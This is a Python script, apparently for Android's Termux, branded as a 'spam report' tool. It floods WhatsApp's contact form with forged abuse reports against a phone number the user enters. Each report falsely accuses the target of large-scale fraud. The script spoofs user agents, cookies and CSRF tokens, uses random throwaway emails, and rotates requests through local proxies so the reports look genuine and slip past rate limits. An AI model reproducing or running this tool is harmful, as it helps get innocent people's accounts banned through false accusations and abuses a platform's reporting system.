import os
import subprocess
import requests
import random
import time
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from fake_useragent import UserAgent
import string

console = Console()

def clear_console():
    os.system('clear' if os.name == 'posix' else 'cls')
    
clear_console()
def start_tinyproxy(port):
    console.print(f"[cyan]CONNECTION TO PORT {port}[/cyan]", style="bold blue")
    if not os.path.exists("/data/data/com.termux/files/usr/bin/tinyproxy"):
        console.print("[red]MENGINSTALL BAHAN[/red]", style="bold yellow")
        os.system("pkg install tinyproxy -y")
        os.system("pkg install python3 -y")
        os.system("pip install rich")
        os.system("pip install fake_useragent")
        
    
    config_path = f"/data/data/com.termux/files/usr/etc/tinyproxy_{port}.conf"
    if not os.path.exists(config_path):
        console.print(f"[yellow]DEFAULT[/yellow]", style="bold yellow")
        os.system(f"echo 'Port {port}\nAllow 127.0.0.1' > {config_path}")
    
    subprocess.Popen(["tinyproxy", "-c", config_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    console.print(f"[green]CONNECTION TO http://127.0.0.1:{port}[/green]")
    return f"127.0.0.1:{port}"
    
def validate_proxy(proxy):
    test_url = "http://httpbin.org/ip"
    proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        response = requests.get(test_url, proxies=proxies_dict, timeout=5)
        if response.status_code == 200:
            console.print(f"[green]CONNECTION : {proxy} : True[/green]")
            return True
    except Exception:
        console.print(f"[red]CONNECTION : {proxy} : False[/red]")
    return False

def get_random_user_agent():
    ua = UserAgent()
    return ua.random

def get_random_cookie():
    csrf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    return {
        'wa_csrf': csrf_token,
        'wa_lang_pref': 'id',
        'wa_ul': session_id
    }

url = 'https://www.whatsapp.com/contact/noclient/async/new/'

def send_report(phone_number, proxies):
    headers = {
        'authority': 'www.whatsapp.com',
        'accept': '*/*',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.whatsapp.com',
        'referer': 'https://www.whatsapp.com/contact/?subject=messenger',
        'sec-ch-ua': f'"{random.choice(["Not-A.Brand", "Chromium"])}";v="{random.randint(90, 99)}", "Chromium";v="{random.randint(110, 124)}"',
        'sec-ch-ua-mobile': random.choice(['?0', '?1']),
        'sec-ch-ua-platform': f'"{random.choice(["Windows", "Android", "iOS"])}"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': get_random_user_agent(),
        'x-asbd-id': str(random.randint(100000, 999999)),
        'x-fb-lsd': 'AVoCvX9IGCU'
    }

    proxy = random.choice(proxies)
    proxies_dict = {"http": proxy, "https": proxy}

    data = {
        'country_selector': 'ID',
        'email': f'{random_string()}@tempmail.com',
        'email_confirm': f'{random_string()}@tempmail.com',
        'phone_number': phone_number,
        'platform': random.choice(['WHATS_APP_WEB_DESKTOP', 'WHATS_APP_ANDROID']),
        'your_message': f'Nomer ini +62{phone_number} Melakukan peniuan dengan nominal yang cukup besar, penipuan itu melalui whatsapp dan saya memohon untuk pihak whatsapp menindak lanjutinya, saya dan banyak orang juga telah tertipu oleh pengguna itu',
        'step': 'submit',
    }

    try:
        cookies = get_random_cookie()
        response = requests.post(url, headers=headers, data=data, proxies=proxies_dict, cookies=cookies, timeout=10)
        if response.status_code == 200:
           console.print(f"\n[bold cyan]╭───────────────────────────────────────\n╰─> [ BERHASIL SPAM RIPORT ] : @{phone_number}[/bold cyan]")
        else:
           console.print(f"[red]ANDA LIMIT : {response.status_code}[/red]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

def random_string(length=10):
    characters = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(characters) for _ in range(length))

ports = [8888 + i for i in range(15)]
proxies_list = []

for port in ports:
    proxy = start_tinyproxy(port)
    if validate_proxy(proxy):
        proxies_list.append(proxy)

if not proxies_list:
    console.print("[red]COOKIE TIDAK ADA YANG TERHUBUNG[/red]", style="bold red")
    exit()

clear_console()
console.print(Panel("[bold red]██████╗  ██╗ ███████╗  █████╗   █████╗   █████╗\n██╔══██╗ ██║ ╚══███╔╝ ██╔══██╗ ██╔══██╗ ██╔══██╗\n██║  ██║ ██║   ███╔╝  ╚██████║ ╚██████║ ╚██████║\n[bold white]██║  ██║ ██║  ███╔╝    ╚═══██║  ╚═══██║  ╚═══██║\n██████╔╝ ██║ ███████╗  █████╔╝  █████╔╝  █████╔╝\n╚═════╝  ╚═╝ ╚══════╝  ╚════╝   ╚════╝   ╚════╝\n\n[bold red]● [bold yellow]● [bold green]●\n[bold red]────────────────────────────────────────────────────────‎\n[bold yellow]-----● SCRIPT SPAM RIPORT ●-----[/bold yellow]\n\n[bold green]PEMBUAT : DIZ FLYZE 999\nYOUTUBE : DIZFLYZE999\nVERSION : v999 KING SPAM REPORT😎[/bold green]‎ ‎ ‎ ‎ ‎ ‎\n[bold red]──────────────────────────────────────────────────────── ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎    [bold red]● [bold yellow]● [bold green]●", style="bold red"))
console.print(Panel("[bold yellow]MASUKAN NOMOR TARGET DENGAN 8XXX\nINGAT JANGAN SPAM BERLEBIHAN!\nSCRIPT INI MUDAH DOWN JADI SPAM REPORT\n1 HARI 5X SPAM RIPORT KE NOMOR YANG SAMA", style="bold red"))
console.print("[bold cyan]╭────────────────────────────────────────────────────────")
phone_number = console.input("[bold cyan]╰─> [ NOMER TARGET ] : [/bold cyan]")

with Progress() as progress:
    task = progress.add_task("[cyan]PROSES BANG :", total=10)

    for _ in range(15):
        send_report(phone_number, proxies_list)
        progress.update(task, advance=1)
        time.sleep(random.randint(2, 5))
